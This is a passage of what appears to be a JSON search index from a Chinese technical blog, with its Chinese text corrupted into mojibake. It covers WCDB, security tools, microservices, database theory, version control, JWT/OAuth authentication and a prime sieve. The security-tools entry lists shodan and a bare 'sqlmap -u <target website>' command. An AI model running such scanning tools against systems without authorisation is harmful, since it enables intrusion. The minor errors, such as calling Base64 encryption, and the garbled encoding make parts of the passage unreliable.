n)$$ï¼›\n  å¹³å‡å†™æ€§èƒ½ä¸º O(1)ï¼Œæœ€åå†™æ€§èƒ½ä¸ºæ‰§è¡Œ checkpoint æ—¶ï¼Œå› ä¸ºè¿›è¡Œäº†å¼‚æ­¥ä¼˜åŒ–ï¼Œæ‰€ä»¥ç”¨æˆ·æ— æ„ŸçŸ¥ï¼›\n  æ•°æ®å®Œæ•´æ€§èƒ½ï¼šWCDB ä¼šå®šæœŸå¤‡ä»½ master è¡¨ï¼Œå¹¶åœ¨æŸåæ—¶è‡ªåŠ¨æ¢å¤ï¼Œæ•°æ®å®Œæ•´æ€§èƒ½ä¼˜äº WAL æ¨¡å¼çš„ SQLiteã€‚\n  ç©ºé—´æ€§èƒ½ï¼šé™¤äº†æ•°æ®åº“å¼€é”€å¤–ï¼Œè¿˜æœ‰å¤‡ä»½ master è¡¨çš„å¼€é”€ï¼Œä½†æ˜¯è¯¥å¼€é”€æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ç©ºé—´æ€§èƒ½å’Œ WAL æ¨¡å¼ä¸‹çš„ SQLite ç±»ä¼¼ã€‚\n  å¹¶å‘æ€§èƒ½ï¼šçº¿ç¨‹å®‰å…¨ï¼Œæ”¯æŒè¯»è¯»å¹¶å‘ï¼Œè¯»å†™å¹¶å‘ï¼Œä¸æ”¯æŒå†™å¹¶å‘ã€‚\n  "},{"id":177,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/","title":"å¸¸è§å®‰å…¨å·¥å…·æ±‡æ€»","section":"æ‚é¡¹åšå®¢","content":"å¸¸è§å®‰å…¨å·¥å…·æ±‡æ€» #  å…³äºå„ç§å·¥å…·çš„ç”¨é€”æ€»ç»“ï¼š\nWEB å·¥å…· #  shodanï¼š\n# å®‰è£… $ pip install shodan  # åˆå§‹åŒ– $ shodan init \u0026lt;API KEY\u0026gt;  # è¯¦ç»†è§ï¼šhttps://cli.shodan.io/ sqlmapï¼š\n# å®‰è£… $ pip install sqlmap  # ä½¿ç”¨ $ sqlmap -u \u0026lt;target website\u0026gt; å¯†ç å­¦å·¥å…· #  z3ï¼Œpycryptoï¼Œsagemath\nPE Portable Executable #    VirusTotalï¼šä¸€ä¸ªåˆ†æç—…æ¯’æ–‡ä»¶çš„åœ¨çº¿ç½‘ç«™ã€‚\n  pefileï¼šä¸€ä¸ªé™æ€åˆ†æ PE æ–‡ä»¶çš„ python åº“ã€‚æºä»£ç \n  capstoneã€keystone-enginneï¼šä¸€ä¸ªå¤„ç†åæ±‡ç¼–ç¨‹åºçš„åº“å’Œä¸€ä¸ªå¤„ç†æ±‡ç¼–ç¨‹åºçš„åº“ï¼Œå¯ä»¥ä½¿ç”¨ pythonã€c++ ç­‰è¯­è¨€ç¼–å†™ã€‚æºä»£ç \n  "},{"id":178,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A6%82%E5%BF%B5%E5%85%A5%E9%97%A8/","title":"å¾®æœåŠ¡æ¦‚å¿µå…¥é—¨","section":"æ‚é¡¹åšå®¢","content":"å¾®æœåŠ¡æ¦‚å¿µå…¥é—¨ #  æœåŠ¡å‘ç° #   https://zhuanlan.zhihu.com/p/161277955\n ä½¿ç”¨ä¸€ä¸ªåå­—æœåŠ¡å™¨è¿›è¡ŒæœåŠ¡å‘ç°ã€‚è§£å†³åˆ†å¸ƒå¼å¾®æœåŠ¡çš„ç½‘ç»œè°ƒç”¨ç»“æ„é—®é¢˜ã€‚\næœåŠ¡é™æµ #   https://zhuanlan.zhihu.com/p/65900436\n æœåŠ¡é™æµç®—æ³•ï¼š\n è®¡æ•°å™¨ç®—æ³•ã€æ¼æ¡¶ç®—æ³•ã€ä»¤ç‰Œç®—æ³•  æœåŠ¡é›ªå´©é™çº§ç†”æ–­ #  æœåŠ¡é›ªå´©ï¼š\n ä¸€ä¸ªæœåŠ¡å¤±è´¥ï¼Œå¯¼è‡´æ•´æ¡é“¾è·¯çš„æœåŠ¡éƒ½å¤±è´¥çš„æƒ…å½¢ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæœåŠ¡é›ªå´©ã€‚  æœåŠ¡ç†”æ–­ï¼š\n å½“ä¸‹æ¸¸çš„æœåŠ¡å› ä¸ºæŸç§åŸå› çªç„¶å˜å¾—ä¸å¯ç”¨æˆ–å“åº”è¿‡æ…¢ï¼Œä¸Šæ¸¸æœåŠ¡ä¸ºäº†ä¿è¯è‡ªå·±æ•´ä½“æœåŠ¡çš„å¯ç”¨æ€§ï¼Œä¸å†ç»§ç»­è°ƒç”¨ç›®æ ‡æœåŠ¡ï¼Œç›´æ¥è¿”å›ï¼Œå¿«é€Ÿé‡Šæ”¾èµ„æºã€‚  æœåŠ¡é™çº§ï¼š\n å½“ä¸‹æ¸¸çš„æœåŠ¡å› ä¸ºæŸç§åŸå› å“åº”è¿‡æ…¢ï¼Œä¸‹æ¸¸æœåŠ¡ä¸»åŠ¨åœæ‰ä¸€äº›ä¸å¤ªé‡è¦çš„ä¸šåŠ¡ï¼Œé‡Šæ”¾å‡ºæœåŠ¡å™¨èµ„æºï¼Œå¢åŠ å“åº”é€Ÿåº¦ã€‚  "},{"id":179,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","title":"æ•°æ®åº“åŸºæœ¬æ¦‚å¿µ","section":"æ‚é¡¹åšå®¢","content":"æ•°æ®åº“åŸºæœ¬æ¦‚å¿µ #  ä»€ä¹ˆæ˜¯ NOSQLï¼Ÿ\n NoSQL(NoSQL = Not Only SQL )ï¼Œæ„å³\u0026quot;ä¸ä»…ä»…æ˜¯SQL\u0026quot;ã€‚  ACID ç†è®º #  å…³ç³»å‹æ•°æ®åº“æœ‰äº‹åŠ¡ï¼ˆtransactionï¼‰çš„æ¦‚å¿µï¼Œäº‹åŠ¡éµå¾ª ACID åŸåˆ™ï¼š\n A (Atomicity åŸå­æ€§)ï¼šäº‹åŠ¡é‡Œçš„æ‰€æœ‰æ“ä½œè¦ä¹ˆå…¨éƒ¨åšå®Œï¼Œè¦ä¹ˆéƒ½ä¸åšï¼Œäº‹åŠ¡æˆåŠŸçš„æ¡ä»¶æ˜¯äº‹åŠ¡é‡Œçš„æ‰€æœ‰æ“ä½œéƒ½æˆåŠŸï¼Œåªè¦æœ‰ä¸€ä¸ªæ“ä½œå¤±è´¥ï¼Œæ•´ä¸ªäº‹åŠ¡å°±å¤±è´¥ï¼Œéœ€è¦å›æ»šã€‚ C (Consistency ä¸€è‡´æ€§)ï¼š I (Isolation ç‹¬ç«‹æ€§)ï¼š D (Durability æŒä¹…æ€§)ï¼š  åˆ†å¸ƒå¼ç³»ç»Ÿ #  ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Ÿ\n ç®€å•çš„æ¥è¯´ï¼Œä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿæ˜¯ä¸€ç»„è®¡ç®—æœºç³»ç»Ÿä¸€èµ·å·¥ä½œï¼Œåœ¨ç»ˆç«¯ç”¨æˆ·çœ‹æ¥ï¼Œå°±åƒä¸€å°è®¡ç®—æœºåœ¨å·¥ä½œä¸€æ ·ã€‚è¿™ç»„ä¸€èµ·å·¥ä½œçš„è®¡ç®—æœºï¼Œæ‹¥æœ‰å…±äº«çš„çŠ¶æ€ï¼Œä»–ä»¬åŒæ—¶è¿è¡Œï¼Œç‹¬ç«‹æœºå™¨çš„æ•…éšœä¸ä¼šå½±å“æ•´ä¸ªç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œã€‚  åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¼˜ç‚¹ï¼š\n  **å¯é æ€§ï¼ˆå®¹é”™ï¼‰ ï¼š**åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿä¸­çš„ä¸€ä¸ªé‡è¦çš„ä¼˜ç‚¹æ˜¯å¯é æ€§ã€‚ä¸€å°æœåŠ¡å™¨çš„ç³»ç»Ÿå´©æºƒå¹¶ä¸å½±å“åˆ°å…¶ä½™çš„æœåŠ¡å™¨ã€‚\n  **å¯æ‰©å±•æ€§ï¼š**åœ¨åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿå¯ä»¥æ ¹æ®éœ€è¦å¢åŠ æ›´å¤šçš„æœºå™¨ã€‚\n  **èµ„æºå…±äº«ï¼š**å…±äº«æ•°æ®æ˜¯å¿…ä¸å¯å°‘çš„åº”ç”¨ï¼Œå¦‚é“¶è¡Œï¼Œé¢„è®¢ç³»ç»Ÿã€‚\n  **çµæ´»æ€§ï¼š**ç”±äºè¯¥ç³»ç»Ÿæ˜¯éå¸¸çµæ´»çš„ï¼Œå®ƒå¾ˆå®¹æ˜“å®‰è£…ï¼Œå®æ–½å’Œè°ƒè¯•æ–°çš„æœåŠ¡ã€‚\n  **æ›´å¿«çš„é€Ÿåº¦ï¼š**åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿå¯ä»¥æœ‰å¤šå°è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›ï¼Œä½¿å¾—å®ƒæ¯”å…¶ä»–ç³»ç»Ÿæœ‰æ›´å¿«çš„å¤„ç†é€Ÿåº¦ã€‚\n  **å¼€æ”¾ç³»ç»Ÿï¼š**ç”±äºå®ƒæ˜¯å¼€æ”¾çš„ç³»ç»Ÿï¼Œæœ¬åœ°æˆ–è€…è¿œç¨‹éƒ½å¯ä»¥è®¿é—®åˆ°è¯¥æœåŠ¡ã€‚\n  **æ›´é«˜çš„æ€§èƒ½ï¼š**ç›¸è¾ƒäºé›†ä¸­å¼è®¡ç®—æœºç½‘ç»œé›†ç¾¤å¯ä»¥æä¾›æ›´é«˜çš„æ€§èƒ½ï¼ˆåŠæ›´å¥½çš„æ€§ä»·æ¯”ï¼‰ã€‚\n  åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç¼ºç‚¹ï¼š\n  **æ•…éšœæ’é™¤ï¼š**æ•…éšœæ’é™¤å’Œè¯Šæ–­é—®é¢˜ã€‚\n  **è½¯ä»¶ï¼š**æ›´å°‘çš„è½¯ä»¶æ”¯æŒæ˜¯åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿçš„ä¸»è¦ç¼ºç‚¹ã€‚\n  **ç½‘ç»œï¼š**ç½‘ç»œåŸºç¡€è®¾æ–½çš„é—®é¢˜ï¼ŒåŒ…æ‹¬ï¼šä¼ è¾“é—®é¢˜ï¼Œé«˜è´Ÿè½½ï¼Œä¿¡æ¯ä¸¢å¤±ç­‰ã€‚\n  **å®‰å…¨æ€§ï¼š**å¼€æ”¾ç³»ç»Ÿçš„ç‰¹æ€§è®©åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿå­˜åœ¨ç€æ•°æ®çš„å®‰å…¨æ€§å’Œå…±äº«çš„é£é™©ç­‰é—®é¢˜ã€‚\n  CAP ç†è®º #  åœ¨è®¡ç®—æœºç§‘å­¦ä¸­, CAPå®šç†ï¼ˆCAP theoremï¼‰, åˆè¢«ç§°ä½œ å¸ƒé²å°”å®šç†ï¼ˆBrewer\u0026rsquo;s theoremï¼‰, å®ƒæŒ‡å‡ºå¯¹äºä¸€ä¸ªåˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿæ¥è¯´ï¼Œä¸å¯èƒ½åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸‰ç‚¹:\n ä¸€è‡´æ€§(Consistency)ï¼šæ‰€æœ‰èŠ‚ç‚¹åœ¨åŒä¸€æ—¶é—´å…·æœ‰ç›¸åŒçš„æ•°æ®ï¼› å¯ç”¨æ€§(Availability)ï¼šä¿è¯æ¯ä¸ªè¯·æ±‚ä¸ç®¡æˆåŠŸæˆ–è€…å¤±è´¥éƒ½æœ‰å“åº”ï¼› åˆ†éš”å®¹å¿(Partition tolerance)ï¼šç³»ç»Ÿä¸­ä»»æ„ä¿¡æ¯çš„ä¸¢å¤±æˆ–å¤±è´¥ä¸ä¼šå½±å“ç³»ç»Ÿçš„ç»§ç»­è¿ä½œï¼›  å› ä¸ºä¸‰è€…æ— æ³•åŒæ—¶æ»¡è¶³ï¼Œæ‰€ä»¥åˆ†å¸ƒå¼ç³»ç»Ÿå¯ä»¥è¢«åˆ†ä¸º CAã€CPã€AP ä¸‰å¤§ç±»ï¼Œå› ä¸º CA ç³»ç»Ÿæœ¬è´¨åªæ˜¯å•ç‚¹é›†ç¾¤ï¼Œæ‰€ä»¥æ— æ³•æ»¡è¶³ P çš„ç³»ç»Ÿåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå› æ­¤æˆ‘ä»¬é€šå¸¸åªè®¨è®º AP æˆ– CP ç³»ç»Ÿã€‚\nBASE ç†è®º #  BASEï¼šBasically Available, Soft-state, Eventually Consistentã€‚ ç”± Eric Brewer å®šä¹‰ã€‚\nç›¸å¯¹äº CAP ç†è®ºï¼ŒBASE ç†è®ºåˆ™å¼ºè°ƒå¯ç”¨æ€§è¶…è¿‡ä¸€è‡´æ€§ï¼Œé€šå¸¸ç”¨äºæè¿° NoSQL æ•°æ®åº“çš„ç‰¹æ€§ã€‚\n Basically Availableï¼šåŸºæœ¬å¯ç”¨ Soft-Stateï¼šè½¯çŠ¶æ€/æŸ”æ€§äº‹åŠ¡ã€‚å³åœ¨æ²¡æœ‰ä»»ä½•è¾“å…¥çš„æƒ…å†µä¸‹ï¼ŒçŠ¶æ€ä¹Ÿä¼šå‘ç”Ÿå˜æ›´ã€‚ Eventually Consistencyï¼šæœ€ç»ˆä¸€è‡´æ€§ã€‚ç³»ç»Ÿä¼šéšç€æ—¶é—´çš„å˜åŒ–æœ€ç»ˆè¾¾åˆ°ä¸€è‡´æ€§çš„è¦æ±‚ã€‚  "},{"id":180,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/","title":"ç‰ˆæœ¬æ§åˆ¶","section":"æ‚é¡¹åšå®¢","content":"ç‰ˆæœ¬æ§åˆ¶ #  ç°åœ¨æµè¡Œçš„ç‰ˆæœ¬ç³»ç»Ÿä¸»è¦åˆ†ä¸ºé›†ä¸­å¼ç‰ˆæœ¬ç³»ç»Ÿã€åˆ†å¸ƒå¼ç‰ˆæœ¬ç³»ç»Ÿ 2 å¤§ç±»ã€‚\né›†ä¸­å¼ç‰ˆæœ¬ç³»ç»Ÿ #  ä¸»è¦çš„é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼š\n CVS (Concurrent Versions System) free softwareï¼Œä»¥ GNU ç‰ˆæƒå‘è¡Œï¼Œè®¸å¤šè€çš„ GNU é¡¹ç›®éƒ½ç”¨ CVSï¼Œ2008 å¹´åæ›´æ–°ä¸æ´»è·ƒã€‚ Subversion (Apache Subversion) Apache Licenseï¼Œtop-level Apache projectï¼Œå…¼å®¹ CVSã€‚ SVN åˆ™æ˜¯æœ€è‘—åçš„é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚  SVN çš„ä¸»è¦ç‰¹ç‚¹ï¼š\n  SVN éœ€è¦ä¸€ä¸ªä¸­å¿ƒæœåŠ¡å™¨ï¼Œç”¨æ¥ä¿å­˜æ‰€æœ‰æ–‡ä»¶çš„æ‰€æœ‰ä¿®è®¢ç‰ˆæœ¬ã€‚\n  å®¢æˆ·ç«¯åªä¿å­˜æœ€æ–°çš„ç‰ˆæœ¬æˆ–è€…è®¾ç½®ä¸ºæ£€å‡ºæŸä¸€ä¸ªå†å²ç‰ˆæœ¬ï¼Œå®¢æˆ·ç«¯å¿…é¡»åœ¨è¿æ¥åˆ°ä¸­å¿ƒæœåŠ¡å™¨ä¹‹åæ‰èƒ½åšå‡ºæ£€å‡ºæŸä¸ªç‰ˆæœ¬ã€æŸ¥è¯¢æ–‡ä»¶ä¿®æ”¹å†å²ã€æäº¤æ›´æ–°ç­‰æ“ä½œã€‚\n  æ¯ä¸€æ¬¡ commit ä¹‹å‰ï¼Œéƒ½éœ€è¦è¿æ¥ä¸­å¿ƒæœåŠ¡å™¨è·å–æœ€æ–°çš„æ–‡ä»¶ç‰ˆæœ¬ï¼Œå¦‚æœä¸­å¿ƒæœåŠ¡å™¨å®•æœºï¼Œåˆ™ä½ æ— æ³•æäº¤ä»»ä½•æ›´æ–°ï¼Œä¹Ÿæ— æ³•å°†é¡¹ç›®å›æº¯åˆ°å†å²ç‰ˆæœ¬ã€‚\n  å¦‚æœä¸­å¿ƒæœåŠ¡å™¨å‘ç”Ÿç£ç›˜æ•…éšœï¼Œè€Œä½ åˆæ²¡æœ‰åšä»»ä½•å¤‡ä»½ï¼Œä½ å°†ä¼šä¸¢å¤±å½“å‰å’Œå†å²çš„æ‰€æœ‰æ•°æ®ã€‚\n  å¯¹ åˆ†æ”¯ çš„æ”¯æŒè¾ƒå¼±ï¼ŒSVN çš„åˆ†æ”¯å°±æ˜¯ä¸€ä¸ªå®Œæ•´ã€ç‹¬ç«‹çš„æ–‡ä»¶å¤¹ï¼Œåˆ†æ”¯çš„åˆ›å»ºå’Œåˆå¹¶ä»£ä»·éƒ½éå¸¸é«˜ï¼ˆå®é™…å¯èƒ½ä¼šé€šè¿‡ç¡¬è¿æ¥çš„æ–¹å¼èŠ‚çœç©ºé—´ï¼‰ï¼›\n  æ— æ³•è¿½è¸ªç›®å½•æ–‡ä»¶çš„å˜åŒ–ï¼Œå˜æ›´ç›®å½•éœ€è¦ä½¿ç”¨ SVN å‘½ä»¤ã€‚\n  ç®¡ç†å‘˜èƒ½å¤Ÿè½»æ¾æŒæ¡æ¯ä¸€ä¸ªå¼€å‘è€…çš„æƒé™ï¼ˆGit è‡ªèº«ä¸æ”¯æŒåˆ†æ”¯ä¿æŠ¤ï¼‰ã€‚\n  åˆ†å¸ƒå¼ç‰ˆæœ¬ç³»ç»Ÿ #  ä¸»è¦çš„åˆ†å¸ƒå¼ç®¡ç†ç³»ç»Ÿï¼š\n Git ç¬¬ä¸€ä¸ªç‰ˆæœ¬ç”± Linus Torvalds ç¼–å†™ï¼ŒGNU GPL v2 Mercurial åŸºæœ¬ç”¨ python å®ç°ï¼Œç›®å‰ GNU GPL v2ã€‚ä»åœ¨ç”¨å®ƒç®¡ç†çš„é¡¹ç›®  Git å’Œ Mercurial éƒ½æ˜¯ä¸ºäº†ç®¡ç† Linux kernel è€Œå¼€å‘çš„ï¼Œåªä¸è¿‡æœ€åç¤¾åŒºé€‰æ‹©äº† Gitã€‚\nå¯¹äº Gitï¼Œä¸­å¿ƒæœåŠ¡å™¨æ˜¯å¯é€‰çš„ï¼Œå®¢æˆ·ç«¯ä¸ä»…ä»…æå–æœ€æ–°ç‰ˆæœ¬çš„æ–‡ä»¶å¿«ç…§ï¼Œè€Œæ˜¯æŠŠæ•´ä¸ªä»£ç ä»“åº“å®Œæ•´åœ°é•œåƒä¸‹æ¥ã€‚è¿™æ ·ä½ åœ¨ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸­åšå‡ºä»»ä½•æäº¤ã€æ£€å‡ºï¼Œæ¯”è¾ƒç­‰æ“ä½œéƒ½æ˜¯åœ¨æœ¬åœ°è¿›è¡Œï¼Œå¦‚æœç”¨æ¥ååŒå·¥ä½œçš„ä¸­å¿ƒæœåŠ¡å™¨å‘ç”Ÿæ•…éšœï¼Œäº‹åå¯ä»¥ç”¨ä»»ä½•ä¸€ä¸ªé•œåƒæ¥æ¢å¤ä»£ç ä»“åº“ã€‚\n"},{"id":181,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%94%A8%E6%88%B7%E7%B3%BB%E7%BB%9F/","title":"ç”¨æˆ·ç³»ç»Ÿ","section":"æ‚é¡¹åšå®¢","content":" å‚è€ƒï¼š\n https://sherryhsu.medium.com/session-vs-token-based-authentication-11a6c5ac45e4 https://jwt.io/introduction https://stackoverflow.com/questions/43452896/authentication-jwt-usage-vs-session https://en.wikipedia.org/wiki/OAuth   ç”¨æˆ·ç³»ç»Ÿ #  Session Base Authentication #  æµç¨‹ç®€ä»‹ #  æœ€ä¼ ç»Ÿçš„ç”¨æˆ·ç³»ç»Ÿï¼Œdjango çš„é»˜è®¤å®ç°ï¼Œç”¨æˆ·ç™»é™†æ—¶åæœåŠ¡ç«¯ä¼šä¸ºå½“å‰ä¼šè¯åˆ›å»ºä¸€ä¸ª session å¹¶ä¸”å°† sessionID ä½œä¸º cookie è®¾ç½®åˆ°å®¢æˆ·ç«¯ä¸Šï¼Œç”¨æˆ·æ¯æ¬¡éœ€è¦è®¿é—®æ•æ„Ÿèµ„æºæ—¶éœ€è¦å¸¦ä¸Š sessionIDï¼ŒæœåŠ¡ç«¯é€šè¿‡ session åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»é™†æˆåŠŸã€‚ç®€å•æµç¨‹å¦‚ä¸‹ï¼š\nJWT (Json Web Token) #  æ ¼å¼ #  JWT æ˜¯ä¸€ç§è¢«å†™å…¥ RFC7519 çš„åè®®æ ‡å‡†ã€‚ä¸€ä¸ª JWT çš„æ ¼å¼ç”± Base64 åŠ å¯†çš„ â€œHeaderâ€ã€â€œPayloadâ€ã€â€œSignatureâ€ ä¸‰ä¸ªéƒ¨åˆ†ç”± . å­—ç¬¦æ‹¼æ¥è€Œæˆï¼š\nä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºä¸‰éƒ¨åˆ†çš„ä½œç”¨ï¼š\n header éƒ¨åˆ†è¡¨ç¤ºå½“å‰ JWT çš„ç®—æ³•ï¼› playload åˆ™å­˜å‚¨äº†å½“å‰ç™»é™†ç”¨æˆ·çš„ä¿¡æ¯ï¼ˆåœ¨ä¼ ç»ŸåŸºäº session çš„ç™»é™†ç³»ç»Ÿä¸‹ï¼Œè¿™ä¸€ä¿¡æ¯ä¸€èˆ¬æ˜¯å­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼‰ï¼ŒPlayload åˆ†ä¸º Registered claims/Public claims/Private claims ä¸‰ä¸ªç±»å‹ï¼› signature ç”¨æœåŠ¡ç«¯çš„ç§é’¥è¿›è¡Œ HMAC ç¡®ä¿ playload ä¸­çš„ä¿¡æ¯æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ï¼›  å·¥ä½œæµ #  åœ¨è®¤è¯æˆåŠŸåï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ª JWTã€‚å½“å®¢æˆ·ç«¯éœ€è¦è®¿é—®ä»»ä½•æ•æ„Ÿèµ„æºæ—¶ï¼Œéœ€è¦è®¾ç½® Authorization çš„è¯·æ±‚å¤´ï¼š\nAuthorization: Bearer \u0026lt;token\u0026gt; å›¾ä¾‹ï¼š\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ä¸º Token æ˜¯åœ¨è¯·æ±‚å¤´çš„ Authorization ä¸­å¸¦ä¸Šçš„ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«æµè§ˆå™¨çš„è·¨åŸŸç­–ç•¥ï¼ˆCORS, Cross-Origin Resource Sharingï¼‰å½±å“ã€‚Token ä¸æ˜¯ Cookieã€‚\nä¼˜ç‚¹ä¸ç¼ºç‚¹ #  JWT(Json Web Token) ç›¸å¯¹ SWT(Simple Web Token) ä¸ SMAL(Security Assertion Markup Language Tokens) çš„å¥½å¤„ï¼š\n JWT ç›¸å¯¹äº SMAL æœ‰æ›´å°çš„ä½“ç§¯ï¼Œç›¸å¯¹äºè§£æ xml è§£æ json æ›´åŠ ç®€å•ï¼Œæ›´é€‚åˆåœ¨ http åè®®äº html æ–‡ä»¶çš„åœºæ™¯ä¸‹è¿›è¡Œä¼ è¾“ï¼› JWT ç›¸å¯¹äº SWT æ›´åŠ å®‰å…¨ã€‚SWT åªèƒ½è§£æåŸºäºå…±äº«å¯†é’¥çš„å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œè€Œ JWTï¼ˆSMAL ä¹Ÿæ”¯æŒï¼‰åˆ™æ”¯æŒ X.509 æ ¼å¼çš„å…¬ç§é’¥ç­¾åï¼›  ç›¸æ¯”ä¼ ç»Ÿä½¿ç”¨ sessionID çš„ cookie è¿›è¡Œèº«ä»½æ ¡éªŒçš„å¥½å¤„ï¼š\n Scalabilityï¼ˆå¯æ‰©å±•æ€§ï¼‰ï¼šä¼ ç»Ÿçš„ sessionID ç­–ç•¥å¦‚æœå°†ç”¨æˆ·ä¿¡æ¯æŒä¹…åŒ–å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ¯æ¬¡è¯·æ±‚æ•°æ®åº“éƒ½ä¼šæ‰§è¡Œä¸€æ¬¡æ•°æ®åº“æŸ¥è¯¢ï¼›å¦‚æœå­˜å‚¨åœ¨å†…å­˜ä¸­åˆ™å­˜åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ¨ªå‘æ‰©å±•é—®é¢˜ã€‚jwt å°†ä¿¡æ¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”æœåŠ¡ç«¯åšé‰´æƒï¼Œå°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼› Multiple Devicesï¼šå¯ä»¥ç”¨äºè®¾è®¡ SSO å•ç‚¹ç™»å½•ç³»ç»Ÿï¼Œå› ä¸º JWT Token è¢«è®¾ç½®åœ¨ http è¯·æ±‚å¤´ä¸­ï¼Œå¯ä»¥è§„é¿æµè§ˆå™¨è·¨åŸŸé—®é¢˜ï¼›  JWT ä¹Ÿæœ‰ä¸€äº›ç¼ºç‚¹ï¼Œåœ¨ RFC çš„æ ‡å‡†åè®®ä¸­æ²¡æœ‰æŒ‡å®šè§£å†³æ–¹æ¡ˆï¼š\n å®¢æˆ·ç«¯å­˜å‚¨ä¿¡æ¯çš„å®‰å…¨æ€§ã€JWT ä¿¡æ¯ä¼ è¾“çš„å®‰å…¨æ€§ã€JWT Token éš¾ä»¥è¢«æ§åˆ¶å¤±æ•ˆã€å®¢æˆ·ç«¯ä¿¡æ¯ä¿¡ä»»é—®é¢˜ï¼›  nodejs ç”Ÿæ€ #  jsonwebtoken å¯ä»¥ç”¨äºåœ¨æœåŠ¡ç«¯åˆ›å»ºä¸€ä¸ª JWTï¼Œexpress-jwt ä¸­é—´ä»¶å¯ä»¥ç”¨äºå¯¹ jwt è¿›è¡Œé‰´æƒã€‚\nOAuth (Open Authorization) #  OAuth æ˜¯ä¸€ç§ç¬¬ä¸‰æ–¹æˆæƒåè®®ï¼Œç°åœ¨è®¨è®ºçš„ç‰ˆæœ¬é€šå¸¸æ˜¯ OAuth2.0ï¼Œä¹Ÿæ˜¯ RFC çš„æ ‡å‡†åè®® RFC6749ã€‚\nOAuth çš„å¤§è‡´å·¥ä½œæµç¨‹åœ¨ RFC çš„æ–‡æ¡£ä¸­æœ‰è¯¦ç»†è§£é‡Šï¼š\n +--------+ +---------------+ | |--(A)- Authorization Request -\u0026gt;| Resource | | | | Owner | | |\u0026lt;-(B)-- Authorization Grant ---| | | | +---------------+ | | | | +---------------+ | |--(C)-- Authorization Grant --\u0026gt;| Authorization | | Client | | Server | | |\u0026lt;-(D)----- Access Token -------| | | | +---------------+ | | | | +---------------+ | |--(E)----- Access Token ------\u0026gt;| Resource | | | | Server | | |\u0026lt;-(F)--- Protected Resource ---| | +--------+ +---------------+ åœ¨æ ‡å‡†æ–‡æ¡£æ›´å…³äºä¸åŒæˆæƒæ¨¡å¼çš„ä»‹ç»ï¼Œä¸è¯¦ç»†èµ˜è¿°ã€‚\nå€¼å¾—æ³¨æ„çš„æ˜¯ OAuth ä¸ JWT å¹¶ä¸æ˜¯å¹¶åˆ—çš„å…³ç³»ï¼ŒOAuth ä¸­çš„ Access Token å¯ä»¥ç”¨ JWT å®ç°ï¼Œå®ƒä»¬åº”è¯¥æ˜¯ä¸€ä¸ªåµŒå¥—çš„å…³ç³»ã€‚\nOIDC (OpenID Connection) #  OIDC æ˜¯ä¸€ä¸ªåŸºäº OAuth2.0 çš„èº«ä»½è®¤è¯åè®®ï¼Œ\n"},{"id":182,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E7%B4%A0%E6%95%B0%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95/","title":"ç´ æ•°ç›¸å…³ç®—æ³•","section":"æ‚é¡¹åšå®¢","content":"ç´ æ•°ç›¸å…³ç®—æ³• #  ç´ æ€§æ£€æµ‹ #  å…³äºä¸€äº›ç´ æ€§æ£€æµ‹çš„åº•å±‚ç®—æ³•ï¼Œåœ¨å­¦æ ¡æ—¶ï¼Œä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€è¯¾ä¸Šè®²è¿‡ã€‚\nç´ æ•°æ•°é‡è®¡ç®— #  Sieve of Eratosthenesï¼Œç­›æ³•ï¼š\nalgorithm Sieve of Eratosthenes is input: an integer n \u0026gt; 1. output: all prime numbers from 2 through n. let A be an array of Boolean values, indexed by integers 2 to n, initially all set to true. for i = 2, 3, 4, ..., not exceeding âˆšn do if A[i] is true for j = i2, i2+i, i2+2i, i2+3i, ..., not exceeding n do A[j] := false return all i such that A[i] is true. 